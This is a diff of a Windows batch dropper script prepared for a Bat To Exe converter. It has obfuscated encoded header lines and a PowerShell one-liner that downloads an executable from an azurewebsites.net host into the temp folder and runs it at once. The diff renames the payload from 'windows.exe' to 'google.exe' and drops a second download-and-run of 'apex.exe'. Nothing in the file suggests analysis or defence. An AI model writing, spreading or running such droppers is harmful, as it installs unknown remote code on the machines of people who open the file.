@@ -1,7 +1,7 @@
 ::[Bat To Exe Converter]
 ::
-::YAwzoRdxOk+EWAnk
-::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvHy+uMq18fTbFvIcLs07qKL/cApx2pWJM5xHUXvsQACB5KbV+EXUIDoGBGuXOWep/Rngr1WEfH70g/ew==
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFD5YRTimM3y0Crod7PvH6OWIpUEYUPA2bork2KaqH+kQ5UuqfJUitg==
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -26,19 +26,15 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kbrepo+wm9cnoUJFB44
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kLrepEh035Ikd0JQh5Ae3I=
 ::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 
 
-set files= 'http://mogiant.azurewebsites.net/windows.exe'
+set files= 'http://mogiant.azurewebsites.net/google.exe'
 
 powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
 
-timeout 300
 
-set files= 'http://mogiant.azurewebsites.net/apex.exe'
-
-powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
